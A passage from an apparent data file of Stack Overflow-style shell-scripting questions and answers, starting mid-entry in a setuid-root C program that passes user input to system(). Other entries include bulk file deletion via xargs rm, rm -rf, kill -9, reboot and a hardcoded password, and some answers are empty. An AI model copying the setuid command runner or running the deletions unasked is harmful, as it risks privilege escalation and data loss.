setuid(0);\n        exists |= system(command) == 0;\n    }\n    return exists ? 0 : 1;\n}\nSecurity note: the version above has very simple argument validation (it lets through only strings matching ^[a-z]*$). Real program should probably include better validation.\nTesting\nSuppose we saved the file in test.c. We compile it and add setuid bit:\nroot:~# gcc ./test.c -o ./test\nroot:~# chown root:root ./test\nroot:~# chmod 4755 ./test\nNote that chown goes before chmod. The 4 before usual 755 pattern is the setuid bit.\nNow we can test the program as a normal user.\ndummy:~$ ./test ls; echo $?\nalias ls='ls -vhF1 --color=auto --group-directories-first'\n0\ndummy:~$ ./test blah; echo $?\n1\ndummy:~$ ./test poweroff; echo $?\n/sbin/poweroff\n0\nAnd best of all - it's portable enough to work on cygwin with no problems. :)",
    "How exclude files / folders for remove [duplicate]": "NOTE: Be careful running the following commands.\nfind . -type 'f' | grep -v \"NameToExclude\" | xargs rm \nfind . -type 'd' | grep -v \"NameToExclude\" | xargs rmdir",
    "Shell Scripting: RegEx in if Statement": "if you're using bash, try =~:\n...\nif [[ $line =~ ^End ]]\nNote that the following will NOT work:1\nif [[ \"$line\" =~ \"^End\" ]]",
    "does calling a shell command from within a scripting language slow down performance?": "",
    "How to run C++ application in Android SHELL": "",
    "Hash inside Makefile shell call causes unexpected behaviour": "You have to escape the hash twice in order to use it inside functions: once for Make and once again for the shell.\nThat is,\nFILE = $(shell echo \\\\\\#include\\ \\<ham/hamsterdb.h\\>)\nNotice three backslashes instead of two as one could expect. The third backslash is needed because otherwise the first one would escape the second and the hash would be still unescaped.\nUPD.\nAnother possible solution is to only escape the hash for Make and use Bash single quotes to prevent interpreting the hash as a shell comment. This also eliminates the need of escaping spaces, < and >:\nFILE = $(shell echo '\\#include <ham/hamsterdb.h>')",
    "Temporary operation in a temporary directory in shell script": "Here you go:\n#!/bin/bash\nTDIR=`mktemp -d`\n\ntrap \"{ cd - ; rm -rf $TDIR; exit 255; }\" SIGINT\n\ncd $TDIR\n# do important stuff here\ncd -\n\nrm -rf $TDIR\n\nexit 0",
    "How to execute a windows batch command recursively?": "Suppose your batch is named something like myrename.cmd, then you can easily do the following:\ncall myrename.cmd\nfor /r /d %%x in (*) do (\n    pushd \"%%x\"\n    call myrename.cmd\n    popd\n)\nThe first line will run it for the current directory, the for loop will iterate recursively (/r) over all directories (/d) and execute the part in the parentheses. What we do inside them is change the directory to the one we're currently iterating over with pushd\u2014which has the nice property that you can undo that directory change with popd\u2014and then run the command, which then will be run in the directory we just switched to.\nThis assumes that the batch lies somewhere in the path. If it doesn't and just happens to lie where the batch file above lies, then you can use\n\"%~dp0myrename.cmd\"",
    "How do I create files with special characters in Linux?": "You need to escape special characters with the backslash symbol (\\).\nThis command will create a file named \"\\?$*'KwaMe'*$?\\\":\ntouch \\\"\\\\\\?\\$\\*\\'KwaMe\\'\\*\\$\\?\\\\\\\"\nExplanation\nDouble your \\, like this: \\\\, so that your shell does not interpret the backslashes from your filename as escape characters.\nEscape \" and ', like this: \\\", \\', so that your shell interprets the double quotes as part of the filename.\nEscape $, like this: \\$, otherwise your shell will think you're using a variable.\nEscape ? and *, like this: \\?, \\*, to prevent filename expansion.",
    "What is exclamation mark at beginning of line doing in this BASH snippet?": "The set -e command tells bash to exit if a pipeline returns a non-zero exit status (basically if a command fails).\nThe ! negates the exit status, but it also inhibits the effect of set -e. The idea is that if a command is being executed as part of a condition, you don't want to terminate the shell. If it's preceded by !, the shell effectively assumes that it's being executed as a condition (even if the result is ignored).\nQuoting the bash manual:\nThe shell does not exit if the command that fails is part of the command list immediately following a 'while' or 'until' keyword, part of the test in an 'if' statement, part of any command executed in a '&&' or '||' list except the command following the final '&&' or '||', any command in a pipeline but the last, or if the command's return status is being inverted with '!'.\nhttps://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html\n(You're correct that the ! has nothing to do with history substitution in this context.)\nThe return code for the read built-in is\nzero, unless end-of-file is encountered, read times out (in which case it's greater than 128), a variable assignment error occurs, or an invalid file descriptor is supplied as the argument to -u.\nThe relevant case here is end-of-file. Redirecting the input of read using <<EOT (and disabling normal termination using -d '') means that the read command will encounter an end-of-file, which would cause it to return a non-zero status. The ! prevents this from aborting the script (but the value is still assigned to $SOME_VAR).",
    "Shell script to set up virtualenv and pip": "As I mean to know you have to activate the virtualenv with:\nsource activate\nI am not sure if this can be done from within a shell script, but you can try it as follows:\nvirtualenv -q -p /usr/bin/python3.5 $1\nsource $1/bin/activate\n$1/bin/pip install -r requirements.txt\n# pip install -r requirements.txt\nExcerpt from activate:\n$ cat activate\n# This file must be used with \"source bin/activate\" *from bash*\n# you cannot run it directly",
    "Why does zsh ignore the PATH entry order?": "By default zsh hashes locations of commands the first time they are executed. When executing it a second time the hashed path is used. To refresh the hash table run\nrehash\nor\nhash -r\nThis should happen automatically every time you change PATH and its main use is, when new executables are added to directories already in PATH.\nNote: the following might be overkill for the specific use case. But it also does solve the issue and might be of interest for slightly different use cases.\nIf you do not care about the (probably negligible) performance hit, you can disable hashing of commands by disabling the HASH_CMDS option:\nsetopt nohashcmds\nWhile zsh will still be using the hash table, it will not automatically add every command. So, unless a command is entered to the hash table by other means, zsh will check PATH for the command every time.\nThis might still lead to problems, if the option CORRECT is set. As this does set the hash table in order to provide spelling correction, but will not necessarily refresh it when PATH changes. In order to refresh the table automatically, you can use the precmd hook which is executed each time before the prompt is printed.\nautoload -Uz add-zsh-hook\nauto_rehash () {\n    rehash\n}\nadd-zsh-hook precmd auto_rehash ",
    "Convert apache log date format to epoch in bash": "It seems my date command wants - instead of / between the date parts and that to be separated by a space from the time part. So I used sed to do the conversion like so:\ndate -d \"$(echo '12/Nov/2015:23:28:22' | sed -e 's,/,-,g' -e 's,:, ,')\" +\"%s\"",
    "Permission denied when i try to execute a python script from bash? [duplicate]": "You need to add execute permissions like so:\nchmod u+x python_script.py\nThis assumes that the script is owned by you. If it isn't, you might need to change the group/other execute permissions or chown the file as appropriate.",
    "Using grep inside shell script gives file not found error": "You need to use command substitution:\n#!/usr/bin/env bash\n\ntest=$(grep 'foo' \"$1\")\necho \"$test\"\nCommand substitution allows the output of a command to replace the command itself. Command substitution occurs when a command is enclosed like this:\n$(command)\nor like this using backticks:\n`command`\nBash performs the expansion by executing COMMAND and replacing the command substitution with the standard output of the command, with any trailing newlines deleted. Embedded newlines are not deleted, but they may be removed during word splitting.\nThe $() version is usually preferred because it allows nesting:\n$(command $(command))\nFor more information read the command substitution section in man bash.",
    "Calling makefiles from Shell Script": "A common idiom is to create a shell script with set -e; this will cause the script to exit on the first error.\n#!/bin/sh\nset -e\nmake -f Makefile1\nmake -f Makefile2\n:\nIf you need more control over the script overall, maybe remove set -e and instead explicitly exit on make failure:\nmake -f Makefile1 || exit\nmake -f Makefile2 || exit\nTo reduce code duplication, create a loop:\nfor f in Makefile1 Makefile2; do\n    make -f \"$f\" || exit\ndone\nJust to be explicit, the || \"or\" and && \"and\" connectives are shorthand for\nif make -f Makefile1; then\n     : \"and\" part\nelse\n    : \"or\" part\nfi\nFinally, the behavior you describe sounds exactly like how Make itself behaves. Perhaps a top-level Makefile would actually be a suitable solution for your scenario?\n.PHONY: all\nall:\n    $(MAKE) -f Makefile1\n    $(MAKE) -f Makefile2",
    "Makefile: Passing command line arguments to file inside Makefile": "Something like\nsmktestrun: smktest\n        @../projects/test.sh $(TESTARGS)\nThen call the Makefile with\n$ make smktestrun TESTARGS=\"-abc\"",
    "How to pass variables from a shell script to an expect script?": "From your shell script:\n/mypath/abc $gateway\nFrom your expect script:\n#!/usr/bin/expect\n\nset gateway [lindex $argv 0]; # Grab the first command line parameter\n\nset timeout 3\nspawn ssh \"james@$gateway\"\nexpect \"password:\"\nsend \"TSfdsHhtfs\\r\";\ninteract",
    "Calling shell command from ruby with proper argument escaping": "If you do\nsystem \"echo\", params[:message]\nThen the second argument, will be sent as an argument, it will not be executed.",
    "GitHub Actions to use variables set from shell": "",
    "Snakemake using a rule in a loop": "I think this is a nice opportunity to use recursive programming. Rather than explicitly including conditionals for every iteration, write a single rule that transitions from iteration (n-1) to n. So, something along these lines:\nSAMPLES = [\"SampleA\", \"SampleB\"]\n\nrule all:\n    input:\n        expand(\"loop3/{sample}.txt\", sample=SAMPLES)\n\ndef recurse_sample(wcs):\n    n = int(wcs.n)\n    if n == 1:\n        return \"test/%s.txt\" % wcs.sample\n    elif n > 1:\n        return \"loop%d/%s.txt\" % (n-1, wcs.sample)\n    else:\n        raise ValueError(\"loop numbers must be 1 or greater: received %s\" % wcs.n)\n\nrule loop_n:\n    input: recurse_sample\n    output: \"loop{n}/{sample}.txt\"\n    wildcard_constraints:\n        sample=\"[^/]+\",\n        n=\"[0-9]+\"\n    shell:\n        \"\"\"\n        awk -v loop='loop{wildcards.n}' '{{print $0, loop}}' {input} > {output}\n        \"\"\"\nAs @RussHyde said, you need to be proactive about ensuring no infinite loops are triggered. To this end, we ensure all cases are covered in recurse_sample and use wildcard_constraints to make sure the matching is precise.",
    "docker run throws \"invalid reference format: repository name must be lowercase\" using $(pwd) in volume flag": "For my own circumstance, the output of pwd contained a directory with a space (i.e. /something/Problematic Directory/something-else). This was resolved by wrapping $(pwd) in quotation marks to explicitly identify it as a string:\ndocker run --rm -v \"$(pwd)/app/polymer\":/home/polymer/app jefferyb/polymer-cli polymer build\nThe documentation I read didn't use quotation marks, however this might be better practise when using variable interpolation in shell to avoid these kind of issues.",
    "Does \"argument list too long\" restriction apply to shell builtins?": "In bash, the OS-enforced limitation on command-line length which causes the error argument list too long is not applied to shell builtins.\nThis error is triggered when the execve() syscall returns the error code E2BIG. There is no execve() call involved when invoking a builtin, so the error cannot take place.\nThus, both of your proposed operations are safe: cmd <<< \"$string\" writes $string to a temporary file, which does not require that it be passed as an argv element (or an environment variable, which is stored in the same pool of reserved space); and printf '%s\\n' \"$cmd\" takes place internal to the shell unless the shell's configuration has been modified, as with enable -n printf, to use an external printf implementation.",
    "bash script to run a constant number of jobs in the background": "With GNU xargs:\nprintf '%s\\0' j{1..6} | xargs -0 -n1 -P3 sh -c './\"$1\"' _\nWith bash (4.x) builtins:\nmax_jobs=3; cur_jobs=0\nfor ((i=0; i<6; i++)); do\n  # If true, wait until the next background job finishes to continue.\n  ((cur_jobs >= max_jobs)) && wait -n\n  # Increment the current number of jobs running.\n  ./j\"$i\" & ((++cur_jobs))\ndone\nwait\nNote that the approach relying on builtins has some corner cases -- if you have multiple jobs exiting at the exact same time, a single wait -n can reap several of them, thus effectively consuming multiple slots. If we wanted to be more robust, we might end up with something like the following:\nmax_jobs=3\ndeclare -A cur_jobs=( ) # build an associative array w/ PIDs of jobs we started\nfor ((i=0; i<6; i++)); do\n  if (( ${#cur_jobs[@]} >= max_jobs )); then\n    wait -n # wait for at least one job to exit\n    # ...and then remove any jobs that aren't running from the table\n    for pid in \"${!cur_jobs[@]}\"; do\n      kill -0 \"$pid\" 2>/dev/null && unset cur_jobs[$pid]\n    done\n  fi\n  ./j\"$i\" & cur_jobs[$!]=1\ndone\nwait\n...which is obviously a lot of work, and still has a minor race. Consider using xargs -P instead. :)",
    "iTerm2 closing curly brace not working": "For me it turns out the right ALT key works but not the left and it's because the left ALT key had a different setting.\nYou can change this by going to Preferences -> Profiles -> Keys and changing from Esc+ to Normal",
    "Insert single quote with sed": "The single quotes that you're trying to use in your insertion string are interfering with the ones around the sed command.\nThe simplest thing to do is to use different quotes around your sed command:\n\"5i'mytext' 16/16\"\nNormally it's best to use single quotes around a sed command but it would be more tricky in this case:\n'5i'\"'\"'mytext'\"'\"' 16/16'\nBasically, you need to put the single quotes inside double quotes somehow and in this case there's no reason not to double quote the whole command.\nAs suggested by 123 in the comments, an alternative would be to put your sed command into a script file:\n5i'mytext' 16/16\nThen use the -f switch to sed:\nsed -f script\nThis avoids the need to use two kinds of quotes.",
    "Why would a correct shell script give a wrapped/truncated/corrupted error message? [duplicate]": "TL;DR: Your script or data has Windows style CRLF line endings.\nConvert to Unix style by deleting the carriage returns.\nHow do I check if my script or data has carriage returns?\nThey're detectable as ^M in the output of cat -v yourscript:\n$ cat -v myscript\nls -l myfile^M\nIf your script doesn't have them, your data might -- especially if reading from ini/csv files or curl:\nhostname=$(curl https://example.com/loginhost.txt)\nssh \"$hostname\"            # Shows strange error\necho \"$hostname\" | cat -v  # Shows myhost^M\nHow do I remove them?\nSet your editor to save the file with Unix line endings, aka \"line terminators\" or \"end-of-line characters\", and resave it.\nYou can also remove them from a command line with dos2unix yourscript or cat yourscript | tr -d '\\r' > fixedscript.\nIf found in your data, you can pipe your source through tr -d '\\r':\nhostname=$(curl https://example.com/loginhost.txt | tr -d '\\r')\nWhy do carriage returns cause strange error messages?\nThe \"carriage return\" character, aka CR or \\r, causes the cursor to move to the start of the line, and continue printing from there. In other words, it starts overwriting the line from the start. This is why they wrap strangely:\nIntended:     ssh: Could not resolve hostname myhost\\r: Name or service not known\n\nWritten:      ssh: Could not resolve hostname myhost\\r\nOverwritten:  : Name or service not known\n              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                  \nResult:       : Name or service not knownname myhost",
    "Create a session in the background if it doesn't exist but do not attach in tmux": "If you try to create a session with the same name tmux returns an error with exit code 1.\ndrizzt@liara ~ % tmux new-session -d -s test \ndrizzt@liara ~ % tmux new-session -d -s test\nduplicate session: test\ndrizzt@liara ~ % echo $?\n1\ndrizzt@liara ~ % \nIf you don't like the duplicate session error you can do something like:\ndrizzt@liara ~ % tmux has-session -t test || tmux new-session -d -s test",
    "bash scripting - read single keystroke including special keys enter and space": "Try setting the read delimiter to an empty string then check the builtin $REPLY variable:\nread -d'' -s -n1\nFor some reason I couldn't get it to work specifying a variable.",
    "How do I schedule a timed reboot of my server in seconds? [closed]": "Try\n sleep 5 ; reboot\non your terminal (as root). If you want it in the background, try\n ( sleep 5 ; reboot ) & \nSee also shutdown(8)",
    "How to read data from Excel sheet in Linux using Shell Script? [closed]": "xls2csv will get your xls file into a CSV format.\nPipe that to sed to remove the double-quotes.\nUse while to iterate over each line.\necho each line (l) to awk to get the second ($2) column into the $d (for domain) variable.\nThen send that to browser. You can replace lynx with your favorite browser. A GUI browser will work as easily as a TUI one.\nxls2csv domains.xls | sed -e's/\"//g' | while read l; do d=`echo \"$l\" | awk  '{print $2}'`; lynx \"$d\"; done",
    "Shell execution: time vs. /usr/bin/time": "time is builtin in both zsh and bash. However, which is only built-in to zsh. In bash, when you use which it runs /usr/bin/which which has no idea about shell built-ins.\nSo in bash, you should use:\n$ type time\ntime is a shell keyword\nThe reason time -l ... doesn't work is that the time syntax doesn't include the -l flag.\nIn both cases, it's not really correct to say that time is a built-in function. Calling it a \"reserved word\" or \"shell keyword\" is more accurate, because it applies to an entire pipeline; it cannot be implemented as a function or external command. In that sense, it is similar to other syntactic elements like if and while.",
    "Convert an output to string": "How to fix the problem\nThe shell (or the test command) uses = for string equality and -eq for numeric equality. Some versions of the shell support == as a synonym for = (but = is defined by the POSIX test command). By contrast, Perl uses == for numeric equality and eq for string equality.\nYou also need to use one of the test commands:\nif [ \"$a\" = \"AC adapter : online\" ]\nthen echo \"ONLINE\"\nelse echo \"OFFLINE\"\nfi\nOr:\nif [[ \"$a\" = \"AC adapter : online\" ]]\nthen echo \"ONLINE\"\nelse echo \"OFFLINE\"\nfi\nWith the [[ operator, you could drop the quotes around \"$a\".\nWhy you got the error message\nWhen you wrote:\nif $a -eq \"AC adapter : online\"\nthe shell expanded it to:\nif AC adapter : online -eq \"AC adapter : online\"\nwhich is a request to execute the command AC with the 5 arguments shown, and compare the exit status of the command with 0 (considering 0 \u2014 success \u2014 as true and anything non-zero as false). Clearly, you don't have a command called AC on your system (which is not very surprising).\nThis means you can write:\nif grep -q -e 'some.complex*pattern' $files\nthen echo The pattern was found in some of the files\nelse echo The pattern was not found in any of the files\nfi\nIf you want to test strings, you have to use the test command or the [[ ... ]] operator. The test command is the same as the [ command except that when the command name is [, the last argument must be ].",
    "Scope of \"setenv\" in csh Versus \"export\" in bash": "Exporting a variable means that a copy of that variable is placed into the environment of any newly created child processes. It is a copy of the variable; if the child process modifies the variable, the parent does not see the modification. Moreover, if a child exports a variable, it does not become visible in the parent.\nHence, your two cases are asymmetrical. When you start in csh, export a variable, and then start bash, bash sees the exported variable. When you then export a new variable in bash and exit from bash to go back to csh, all of the variables created in the bash session disappear.\nIf you were to export a variable in bash and then start up a child csh (by typing csh), you would almost certainly see the exported variable.",
    "Echo but retain double quotes": "Double quotes don't nest. Use single quotes:\necho '\nSUBJECT=\"Text here\"\nEMAIL=\"email@domain.co.uk\"\nEMAILMESSAGE=\"/tmp/emailmessage.txt\"\n' > /root/email.txt\nBut this will add empty lines to the top and bottom of the file. If you don't want those:\necho 'SUBJECT=\"Text here\"\nEMAIL=\"email@domain.co.uk\"\nEMAILMESSAGE=\"/tmp/emailmessage.txt\"' > /root/email.txt\nProbably a cleaner solution is to use a \"here document\"\ncat > email.txt <<'EOF'\nSUBJECT=\"Text here\"\nEMAIL=\"email@domain.co.uk\"\nEMAILMESSAGE=\"/tmp/emailmessage.txt\"\nEOF",
    "How do I create a file listener in linux?": "To get notified about events like file creation, opening, modifying etc. look into inotify. A good way to use it from bash is with the inotifywait command - here is its man page. It will block until an event you care about happens. For example:\ninotifywait -e create /path/to/watch\necho \"ding!\"\nwill ding when a file or directory gets created in that path. See the man page for more details.",
    "egrep lines starting with r and ending with g": "adding a . should work\negrep -e \"^r.*g$\"\nIt basically means : everything that starts with a r, then is followed by zero or more anything, and then ends with g.\ntested against\nr fsgdfs gfsdg\nfooo bar\nrfoo g\nfdsqfdsq\n\nrg\nit returns\nr fsgdfs gfsdg\nrfoo g\nrg",
    "Executing subsequent command/script, after the current one was ^C": "./script1.sh && ./script2 i.e. execute 2nd if 1st was successful.\n./script1.sh || ./script2 i.e. execute 2nd if 1st was NOT successful.\nor in script1 you could trap the exit signal and spawn the second process. Something like this:\ns1:\n#!/bin/bash\n\ntrap \"./s2.sh\" SIGINT\n\necho \"hello\"\nsleep 100\ns2:\n#!/bin/bash\n\necho \"goodby\"\nsession:\n$ ./s1.sh \nhello\n^Cgoodby",
    "Linux: Outputting DD results to a text file": "They're output to stderr, so try using 2> instead of >\ndd if=/dev/zero of=/tmp/test.data bs=1k count=128k 2> output.txt",
    "Linux shell script for delete old files from ftp": "This is a script I wrote to remove any files on a remote ftp site older than 7 days. It works by retrieving a listing of the directory, parsing the modified date, and then re-connecting to delete any files older than ndays.\nI suspect that the numbers hard-coded into the loop (element date) may change depending on the setup of your system. The return formatting of the ls command is dependent on the local system settings.\nAssuming your backups are every day, then setting ndays to 10 might solve your problem.\n#!/bin/bash\n# get a list of files and dates from ftp and remove files older than ndays\nftpsite=\"ftp.yourserver.com\"\nftpuser=\"loginusername\"\nftppass=\"password\"\nputdir=\"/public_ftp/admin/logs\"\n\nndays=7\n\n\n# work out our cutoff date\nMM=`date --date=\"$ndays days ago\" +%b`\nDD=`date --date=\"$ndays days ago\" +%d`\n\n\necho removing files older than $MM $DD\n\n# get directory listing from remote source\nlisting=`ftp -i -n $ftpsite <<EOMYF \nuser $ftpuser $ftppass\nbinary\ncd $putdir\nls\nquit\nEOMYF\n`\nlista=( $listing )\n\n# loop over our files\nfor ((FNO=0; FNO<${#lista[@]}; FNO+=9));do\n  # month (element 5), day (element 6) and filename (element 8)\n  #echo Date ${lista[`expr $FNO+5`]} ${lista[`expr $FNO+6`]}          File: ${lista[`expr $FNO+8`]}\n\n  # check the date stamp\n  if [ ${lista[`expr $FNO+5`]}=$MM ];\n  then\n    if [[ ${lista[`expr $FNO+6`]} -lt $DD ]];\n    then\n      # Remove this file\n      echo \"Removing ${lista[`expr $FNO+8`]}\"\n      ftp -i -n $ftpsite <<EOMYF2 \n      user $ftpuser $ftppass\n      binary\n      cd $putdir\n      delete ${lista[`expr $FNO+8`]}\n      quit\nEOMYF2\n\n\n    fi\n  fi\ndone",
    "CODE_SIGN_IDENTITY parameter for xcodebuild (Xcode 4)": "A newer xcodebuild now allows settings to be specified. Taken from developer.apple.com:\nxcodebuild [-project projectname] [-target targetname ...]\n           [-configuration configurationname] [-sdk [sdkfullpath | sdkname]]\n           [buildaction ...] [setting=value ...] [-userdefault=value ...]\nI also found this resource for explaining the available settings\nCODE_SIGN_IDENTITY (Code Signing Identity)\n    Description: Identifier. Specifies the name of a code signing identity.\n    Example value: iPhone Developer\nHowever, PROVISIONING_PROFILE is missing from the index of available commands.\nThe command I finally used specified \"CODE_SIGN_IDENTITY\" & \"PROVISIONING_PROFILE\" settings.\nxcodebuild -sdk <iphoneos> -target <target_name> -configuration <Debug> CODE_SIGN_IDENTITY=\"iPhone Developer: Mister Smith\" PROVISIONING_PROFILE=\"XXXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXX\"",
    "Find the highest user ID in Mac OS X": "This will give you the line with the highest ID:\ndscl . -list /Users UniqueID | sort -nr -k 2 | head -1",
    "How to build and run a shell command based on the contents of several lines in Vim?": "I suggest you use xargs -L1\nExample:\n:%!xargs -L1 wc -l\nBasically xargs [cmd] will run the following [cmd] with multiple parameters from multiple lines. But with the -L1 argument the [cmd] will be executed command for each line.\nIf you need to supply a certain order to the arguments for your command you can use xargs's -I option to supply a pattern to be replaced by the argument list.\nExample:\n:%!xargs -L1 -I {} rake {} --trace\nIf you feel very adventurous you can just execute the code directly like so:\n:%!bash",
    "Running a shell command in a c program": "fork() and system() is what you need",
    "What's the easiest in a shell script to ensure its not run as root?": "Example in bash:\nif [ `id -u` = 0 ]; then\n  echo \"You are root, go away!\"\n  exit 1\nfi",
    "Unix file naming convention for effective tab completion?": "I've generally worked on projects where related files are all in the same directory, and the file names themselves are specialized to indicate their contents.\nOf course, this begs the question, why are you doing tab completion on file names? If you're perusing source code, there are TAGS, CEDET, and a plethora of other utilities that will let you bypass the file name and jump directly the the function/variable you're really after.\nIt all depends on what you're really trying to do, and finding a particular file is usually the means to a different end.",
    "how to get a console shell on my symbian phone?": "There's eshell but it is usually not included in phone SW that is put on the device. You can use it on emulator though.\nThere's a port of zsh that you can also run on the device. It's way more powerful than eshell.",
    "How to handle duplicates in my PATH variable?": "If PATH is manipulated by different scripts that are called by .bashrc, this is usually the result.\nWhile duplicates in PATH aren't a major problem, there are two approaches to keeping PATH free of them:\nCheck if a dir already exists in PATH before adding\nDedupe PATH as the last step in your .bashrc\nCheck before adding\njavabin=\"/cygdrive/c/ProgramFiles/Java/jdk1.8.0_101/bin\"\nif ! [[ $PATH =~ \"$javabin\" ]]; then\n  PATH=\"$PATH:$javabin\"\nfi\nor write a function:\nadd_to_path() {\n    local dir re\n\n    for dir; do\n        re=\"(^$dir:|:$dir:|:$dir$)\"\n        if ! [[ $PATH =~ $re ]]; then\n            PATH=\"$PATH:$dir\"\n        fi\n    done\n}\n\nadd_to_path \"/cygdrive/c/ProgramFiles/Java/jdk1.8.0_101/bin\"\nDedupe (the best method I found on SO)\nPATH=\"$(perl -e 'print join(\":\", grep { not $seen{$_}++ } split(/:/, $ENV{PATH}))')\"\nSee also on Unix & Linux / SuperUser StackExchange:\nPATH is filled with duplicates\nRemove duplicate $PATH entries with awk command\nHow to correctly add a path to PATH?",
    "date: extra operand %d' error": "The problem here is with date itself. Let's see how.\nYou are saying:\nvDate2=`date --date=\"2 minutes ago\" +%b %d %H:%M:%S %Y`\nBecause you want to use\ndate --date=\"2 minutes ago\" +%b %d %H:%M:%S %Y\nHowever, if you try to run it you'll see that you get the error:\ndate: extra operand \u2018%d\u2019\nTry 'date --help' for more information.\nThe problem is that you need to enclose the FORMAT controls within double quotes:\n#                             v                  v\n$ date --date=\"2 minutes ago\" \"+%b %d %H:%M:%S %Y\"\nAug 25 14:49:31 2016\nWhen this is done, all together your full awk one-liner can be:\nawk -v Date=\"$(date \"+%b %d %H:%M:%S %Y\")\" \\\n    -v Date2=\"$(date --date=\"2 minutes ago\" \"+%b %d %H:%M:%S %Y\")\" \\\n     '$5 > Date && $5 < Date2' file\nNote I am using -v Date=\"$(date ...)\":\n$( ) for process substitution, since backticks ` are almost deprecated, ir at least considered legacy.\ndate=\" things \" to prevent errors if the content has spaces.\nv var=value using spaces after -v, since -vvar=value is gawk-specific.",
    "How to execute Zsh shell commands in Bash Script": "You can use it like that :\n#!/bin/bash\n\n/bin/zsh -i -c hello\n-i : Force shell to be interactive\nThen, if the shell is interactive, commands are read from /etc/zshrc and then $ZDOTDIR/.zshrc (this is usually your $HOME/.zshrc)\n-c : Run a command in this shell",
    "Unable to lock file using flock with file descriptor": "You are using -n which will terminate if the lock cannot be acquired immediately and flock will fail with exit code 1. Therefore after you execute your the code in the first terminal, it sleeps for 100 seconds. Next when you execute the same in another terminal, flock fails and returns 1, but because there is a ; and you do not do anything with the return code, the shell simply continues to execute the next statement and sleeps for 100 seconds.\nTherefore you need to take decision on the return code of flock as below.\n( flock -x -n 100 || exit 55; sleep 100; ) 100> /tmp/foo.txt\nNow if you execute the above line in one terminal it will sleep for 100 seconds. Next if you run the code on another terminal it will immediately return to prompt. Do an echo $? and you will see that it has returned 55 as we wanted to return using the || .\nWhat the || does is short-circuiting. If flock returns 0 as in normal exit which is a true value for the shell, it will not execute the right hand side of the expression and therefore go to the next statement. If the return value is 1 which is a false for the shell, it will continue to evaluate the right hand side expression which is exit 55 and therefore exit. You can do this by if-then-fi also.\nAlso note that I have used brackets () instead of curly braces {}. This is because, if you use the curley-braces then the commands will be executed in the current shell and if you use exit, then it will exit from the current shell. A bracket will create a subshell, therefore doing an exit from there terminates the subshell and gets back you to your original shell.\nIt worked for your first example using -c because there you have the single command enclosed within the flock argument. Therefore if flockis unable to acquire the lock it will simply not execute the statement and terminate.",
    "Bash: run an executable file in background": "Any executable in linux can be run in the background as follows:\n $ ./yourExecutable.exe&\nAdd the & character at end. (Assuming yourExecutable.exe is in the current working directory)\nHow to kill it later on?\n$ ps -ax | grep yourExecutable.exe\nYou will get an output like:\n9384  pts/7    S+     0:00 grep yourExecutable.exe\n25082 pts/7    T      0:00 yourExecutable.exe&\nKill the second process using SIGKILL. That is the one you executed in the background.\n$ kill -9 25082",
    "Custom Interactive Shell with AutoComplete": "Try this cmd module. It's designed for that purpose.",
    "Remove new line from find command output": "Find can output a space-separated list of results without relying on other commands:\nfind . -name someFile -type f -printf \"%p \"\nThe above will find all files named \"someFile\" in the current directory or any sub-directories, and then print the results without line breaks.\nFor example, given this directory tree:\n.../dir1/someFile.txt\n.../dir1/dir2/someFile.txt\nRunning find . -name '*.txt' -type f -printf \"%p \" from dir1 will output:\nsomeFile.txt ./dir2/someFile.txt\nThe arguments, options, and \"actions\" (i.e. -printf) passed to the above find command can be modified as follows:\nIf you don't give the -type f option, find will report file system entries of all types named someFile. Further, find's man page lists other parameters that can be given to -type that will cause find to search for directories only, or executable files only, or links only, etc...\nChange -printf \"%p \" to -printf \"%f \" to print file names sans path, or again, see find's man page for other format specifications that find's printf action accepts.\nChange . to some other directory path to search other directory trees.",
    "How to get a substring after the last underscore (_) in unix shell script": "You can do\ns='this_is_test_string1_22'\nIn BASH:\necho \"${s##*_}\"\n22\nOR using sed:\nsed 's/^.*_\\([^_]*\\)$/\\1/' <<< 'this_is_test_string1_22'\n22\nEDIT for sh:\necho \"$s\" | sed 's/^.*_\\([^_]*\\)$/\\1/'",
    "Start lein repl with commands from the terminal": "(echo \"(println :hello)\"; cat <&0) | lein repl\nThis prints the command - letting the REPL process it -, then \"switches back\" to stdin for input. You might have to interrupt the cat call after leaving the REPL, though.",
    "How to broadcast intent with extras through ADB shell?": "",
    "Returning array from a Bash function": "This won't work as expected when there are whitespaces in the arrays:\nfunction create_some_array() {\n    local -a a=()\n    for i in $(seq $1 $2); do\n        a[i]=\"$i $[$i*$i]\"\n    done\n    echo ${a[@]}\n}\nand worse: if you try to get array indices from the outside \"a\", it turns out to be a scalar:\necho ${!a[@]}\neven assignment as an array wont help, as possible quoting is naturally removed by the echo line and evaluation order cannot be manipulated to escape quoting: try\nfunction create_some_array() {\n...\n    echo \"${a[@]}\"\n}\n\na=($(create_some_array 0 10))\necho ${!a[@]}\nStill, printf seems not to help either:\nfunction create_some_array() {\n...\n    printf \" \\\"%s\\\"\" \"${a[@]}\"\n}\nseems to produce correct output on one hand:\n$ create_some_array 0 3; echo\n \"0 0\" \"1 1\" \"2 4\" \"3 9\"\nbut assignment doesn't work on the other:\n$ b=($(create_some_array 0 3))\n$ echo ${!b[@]}\n0 1 2 3 4 5 6 7\nSo my last trick was to do assignment as follows:\n$ eval b=(\"$(create_some_array 0 3)\")\n$ echo -e \"${!b[@]}\\n${b[3]}\"\n0 1 2 3\n3 9\nTataaa!\nP.S.: printf \"%q \" \"${a[@]}\" also works fine...",
    "What's the difference between a graphical shell and a desktop environment": "\"Desktop environment\" (DE) is the whole shebang. The \"desktop shell\", on the other hand, is just the bit that provides the background, task-bar, desktop icons, desktop context menus: generally the \"home\" interface for a particular DE. (The functionality/scope of the shell can vary greatly as well as include and/or overlap the roles of a Window Manager, especially in an X-based system.) The \"shell\" for Windows is \"explorer.exe\" but Windows itself is the \"desktop environment\".\nGenerally file managers, like Nautilus, are not [desktop] shells: e.g. they can [often] be run without the standard \"shell\" (or with a different shell). However, it is quite possible that a file-manager acted as a shell. In the case of [modern] Windows the same executable is used for both the shell and the file-manager, but perhaps hosted in a different process, and yet it serves a different purpose in both roles. (Windows 3.1 had a separate FileMan program.)\nHappy exploring.",
